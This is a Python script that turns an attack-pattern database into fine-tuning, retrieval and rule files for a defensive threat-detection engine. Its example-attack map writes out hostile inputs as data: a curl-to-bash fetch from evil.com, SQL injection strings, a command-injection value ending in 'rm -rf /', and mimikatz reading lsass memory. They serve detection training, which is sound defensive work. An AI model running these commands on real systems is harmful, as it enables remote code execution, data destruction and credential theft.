#!/usr/bin/env python3
"""
Pattern Database to Training Data Converter
Converts NEURAL_TRAINING_DATABASE.md to multiple training formats:
- JSONL for GPT-4 fine-tuning
- RAG embeddings for vector search
- n8n workflows for behavioral detection
- Cortex AI decision rules

Usage:
    python convert_patterns_to_training.py --output-dir ./training_data
"""

import json
import re
from pathlib import Path
from typing import List, Dict, Any
from dataclasses import dataclass, asdict
import argparse


@dataclass
class AttackPattern:
    """Attack pattern extracted from database"""
    id: str
    name: str
    category: str
    signals: List[str]
    truth_weight: float
    f1_score: float
    detection_logic: Dict[str, str]
    guardian_action: str
    cortex_training: str
    mitre_id: str = ""
    owasp_id: str = ""
    cwe_id: str = ""


class PatternDatabaseParser:
    """Parse NEURAL_TRAINING_DATABASE.md"""
    
    def __init__(self, database_path: str):
        self.database_path = Path(database_path)
        self.patterns = []
    
    def parse(self) -> List[AttackPattern]:
        """Extract all patterns from database"""
        with open(self.database_path, 'r') as f:
            content = f.read()
        
        # Extract JSON blocks
        json_blocks = re.findall(r'```json\n(.*?)\n```', content, re.DOTALL)
        
        for block in json_blocks:
            try:
                data = json.loads(block)
                
                # Skip if not a pattern (e.g., just detection logic)
                if 'id' not in data or 'signals' not in data:
                    continue
                
                pattern = AttackPattern(
                    id=data.get('id', ''),
                    name=data.get('name', ''),
                    category=data.get('category', ''),
                    signals=data.get('signals', []),
                    truth_weight=data.get('truth_weight', 0.0),
                    f1_score=data.get('f1_score', 0.0),
                    detection_logic=data.get('detection_logic', {}),
                    guardian_action=data.get('guardian_action', ''),
                    cortex_training=data.get('cortex_training', ''),
                    mitre_id=data.get('id', '') if 'MITRE' in data.get('id', '') else '',
                    owasp_id=data.get('id', '') if 'OWASP' in data.get('id', '') else '',
                    cwe_id=data.get('cwe', '')
                )
                
                self.patterns.append(pattern)
            
            except json.JSONDecodeError as e:
                print(f"Warning: Failed to parse JSON block: {e}")
                continue
        
        print(f"✓ Parsed {len(self.patterns)} patterns from database")
        return self.patterns


class GPT4FineTuningConverter:
    """Convert patterns to GPT-4 fine-tuning JSONL format"""
    
    def __init__(self, patterns: List[AttackPattern]):
        self.patterns = patterns
    
    def generate_training_examples(self) -> List[Dict[str, Any]]:
        """Generate training examples for GPT-4"""
        examples = []
        
        for pattern in self.patterns:
            # Create example attack scenario
            example_attack = self._generate_example_attack(pattern)
            
            # Create expected response
            expected_response = self._generate_expected_response(pattern)
            
            # Format as GPT-4 fine-tuning example
            example = {
                "messages": [
                    {
                        "role": "system",
                        "content": "You are Cortex AI, Sentinel's neural security decision engine. Analyze inputs for threats using MITRE ATT&CK, OWASP, and behavioral patterns. Provide threat score (0.0-1.0) and recommended action."
                    },
                    {
                        "role": "user",
                        "content": f"Analyze this activity:\n{example_attack}"
                    },
                    {
                        "role": "assistant",
                        "content": expected_response
                    }
                ]
            }
            
            examples.append(example)
        
        return examples
    
    def _generate_example_attack(self, pattern: AttackPattern) -> str:
        """Generate realistic attack example"""
        
        # Map pattern IDs to example attacks
        examples = {
            "MITRE-T1059": "Process: nginx → /bin/sh -c 'curl http://evil.com/shell.sh | bash'",
            "MITRE-T1190": "HTTP Request: GET /api/users?id=1' OR '1'='1-- HTTP/1.1",
            "MITRE-T1486": "File Activity: 1,523 files modified in 30 seconds, extensions changed to .locked",
            "OWASP-A03-SQLI": "Input: admin' UNION SELECT password FROM users--",
            "OWASP-A03-CMDI": "Parameter: filename=test.txt; rm -rf /",
            "MITRE-T1548.003": "Command: sudo -u root /bin/bash (from web process)",
            "MITRE-T1003": "Process: mimikatz.exe accessing lsass.exe memory",
        }
        
        # Default example if not in map
        default = f"Activity: {', '.join(pattern.signals[:3])}"
        
        return examples.get(pattern.id, default)
    
    def _generate_expected_response(self, pattern: AttackPattern) -> str:
        """Generate expected Cortex AI response"""
        
        return f"""THREAT DETECTED

Pattern: {pattern.name} ({pattern.id})
Category: {pattern.category}
Signals Detected: {', '.join(pattern.signals[:4])}
Truth Score: {pattern.truth_weight:.2f}
Confidence: {pattern.f1_score:.2f}

Detection Logic:
{self._format_detection_logic(pattern.detection_logic)}

Recommended Action: {pattern.guardian_action}

Cortex Learning: {pattern.cortex_training}
"""
    
    def _format_detection_logic(self, logic: Dict[str, str]) -> str:
        """Format detection logic for readability"""
        return '\n'.join([f"  - {k}: {v}" for k, v in logic.items()])
    
    def save_jsonl(self, output_path: str):
        """Save training examples as JSONL"""
        examples = self.generate_training_examples()
        
        with open(output_path, 'w') as f:
            for example in examples:
                f.write(json.dumps(example) + '\n')
        
        print(f"✓ Saved {len(examples)} training examples to {output_path}")


class RAGEmbeddingsConverter:
    """Convert patterns to RAG embeddings format"""
    
    def __init__(self, patterns: List[AttackPattern]):
        self.patterns = patterns
    
    def generate_rag_documents(self) -> List[Dict[str, Any]]:
        """Generate documents for RAG vector database"""
        documents = []
        
        for pattern in self.patterns:
            # Create comprehensive document for embedding
            doc = {
                "id": pattern.id,
                "content": self._create_document_content(pattern),
                "metadata": {
                    "pattern_id": pattern.id,
                    "pattern_name": pattern.name,
                    "category": pattern.category,
                    "truth_weight": pattern.truth_weight,
                    "f1_score": pattern.f1_score,
                    "mitre_id": pattern.mitre_id,
                    "owasp_id": pattern.owasp_id,
                    "cwe_id": pattern.cwe_id,
                    "signals": pattern.signals,
                    "guardian_action": pattern.guardian_action
                }
            }
            
            documents.append(doc)
        
        return documents
    
    def _create_document_content(self, pattern: AttackPattern) -> str:
        """Create rich document content for embedding"""
        
        content = f"""
Attack Pattern: {pattern.name}
ID: {pattern.id}
Category: {pattern.category}

Description:
This pattern detects {pattern.name.lower()} attacks by monitoring for the following signals:
{self._format_signals(pattern.signals)}

Detection Logic:
{self._format_detection_logic(pattern.detection_logic)}

When this pattern is detected, the Guardian system will: {pattern.guardian_action}

Training Focus: {pattern.cortex_training}

Accuracy Metrics:
- Truth Weight: {pattern.truth_weight} (confidence in detection)
- F1 Score: {pattern.f1_score} (validated accuracy)

Related Standards:
{self._format_standards(pattern)}
"""
        return content.strip()
    
    def _format_signals(self, signals: List[str]) -> str:
        """Format signals as bullet list"""
        return '\n'.join([f"- {signal}" for signal in signals])
    
    def _format_detection_logic(self, logic: Dict[str, str]) -> str:
        """Format detection logic"""
        return '\n'.join([f"- {k}: {v}" for k, v in logic.items()])
    
    def _format_standards(self, pattern: AttackPattern) -> str:
        """Format related standards"""
        standards = []
        if pattern.mitre_id:
            standards.append(f"- MITRE ATT&CK: {pattern.mitre_id}")
        if pattern.owasp_id:
            standards.append(f"- OWASP: {pattern.owasp_id}")
        if pattern.cwe_id:
            standards.append(f"- CWE: {pattern.cwe_id}")
        return '\n'.join(standards) if standards else "- N/A"
    
    def save_json(self, output_path: str):
        """Save RAG documents as JSON"""
        documents = self.generate_rag_documents()
        
        with open(output_path, 'w') as f:
            json.dump(documents, f, indent=2)
        
        print(f"✓ Saved {len(documents)} RAG documents to {output_path}")


class CortexDecisionRulesConverter:
    """Convert patterns to Cortex AI decision rules"""
    
    def __init__(self, patterns: List[AttackPattern]):
        self.patterns = patterns
    
    def generate_decision_rules(self) -> Dict[str, Any]:
        """Generate Cortex decision rules"""
        
        rules = {
            "version": "1.0",
            "last_updated": "2025-12-17",
            "total_patterns": len(self.patterns),
            "categories": self._group_by_category(),
            "rules": []
        }
        
        for pattern in self.patterns:
            rule = {
                "id": pattern.id,
                "name": pattern.name,
                "category": pattern.category,
                "enabled": True,
                "priority": self._calculate_priority(pattern),
                "signals": pattern.signals,
                "truth_weight": pattern.truth_weight,
                "f1_score": pattern.f1_score,
                "detection": {
                    "logic": pattern.detection_logic,
                    "threshold": self._calculate_threshold(pattern)
                },
                "action": {
                    "guardian": pattern.guardian_action,
                    "alert_severity": self._calculate_severity(pattern),
                    "auto_block": pattern.truth_weight >= 0.90
                },
                "learning": {
                    "focus": pattern.cortex_training,
                    "adaptive": True,
                    "feedback_weight": 0.1
                }
            }
            
            rules["rules"].append(rule)
        
        return rules
    
    def _group_by_category(self) -> Dict[str, int]:
        """Group patterns by category"""
        categories = {}
        for pattern in self.patterns:
            categories[pattern.category] = categories.get(pattern.category, 0) + 1
        return categories
    
    def _calculate_priority(self, pattern: AttackPattern) -> int:
        """Calculate rule priority (1-10)"""
        # Higher truth_weight = higher priority
        return min(10, int(pattern.truth_weight * 10))
    
    def _calculate_threshold(self, pattern: AttackPattern) -> float:
        """Calculate detection threshold"""
        # Require at least 50% of signals to trigger
        return 0.5
    
    def _calculate_severity(self, pattern: AttackPattern) -> str:
        """Calculate alert severity"""
        if pattern.truth_weight >= 0.95:
            return "CRITICAL"
        elif pattern.truth_weight >= 0.85:
            return "HIGH"
        elif pattern.truth_weight >= 0.70:
            return "MEDIUM"
        else:
            return "LOW"
    
    def save_json(self, output_path: str):
        """Save decision rules as JSON"""
        rules = self.generate_decision_rules()
        
        with open(output_path, 'w') as f:
            json.dump(rules, f, indent=2)
        
        print(f"✓ Saved {len(rules['rules'])} decision rules to {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Convert pattern database to training data formats"
    )
    parser.add_argument(
        "--database",
        default="/home/jnovoas/sentinel/cortex/NEURAL_TRAINING_DATABASE.md",
        help="Path to pattern database"
    )
    parser.add_argument(
        "--output-dir",
        default="/home/jnovoas/sentinel/cortex/training_data",
        help="Output directory for training data"
    )
    
    args = parser.parse_args()
    
    # Create output directory
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    print("=" * 60)
    print("Cortex AI Training Data Converter")
    print("=" * 60)
    print()
    
    # Parse database
    print("Step 1: Parsing pattern database...")
    db_parser = PatternDatabaseParser(args.database)
    patterns = db_parser.parse()
    print()
    
    # Generate GPT-4 fine-tuning data
    print("Step 2: Generating GPT-4 fine-tuning data...")
    gpt4_converter = GPT4FineTuningConverter(patterns)
    gpt4_converter.save_jsonl(output_dir / "gpt4_finetuning.jsonl")
    print()
    
    # Generate RAG embeddings
    print("Step 3: Generating RAG embeddings...")
    rag_converter = RAGEmbeddingsConverter(patterns)
    rag_converter.save_json(output_dir / "rag_documents.json")
    print()
    
    # Generate Cortex decision rules
    print("Step 4: Generating Cortex decision rules...")
    rules_converter = CortexDecisionRulesConverter(patterns)
    rules_converter.save_json(output_dir / "cortex_decision_rules.json")
    print()
    
    # Summary
    print("=" * 60)
    print("Conversion Complete!")
    print("=" * 60)
    print(f"Total Patterns Processed: {len(patterns)}")
    print(f"Output Directory: {output_dir}")
    print()
    print("Generated Files:")
    print(f"  1. gpt4_finetuning.jsonl - {len(patterns)} training examples")
    print(f"  2. rag_documents.json - {len(patterns)} RAG documents")
    print(f"  3. cortex_decision_rules.json - {len(patterns)} decision rules")
    print()
    print("Next Steps:")
    print("  1. Upload gpt4_finetuning.jsonl to OpenAI for fine-tuning")
    print("  2. Ingest rag_documents.json into vector database")
    print("  3. Load cortex_decision_rules.json into Cortex AI engine")
    print()


if __name__ == "__main__":
    main()
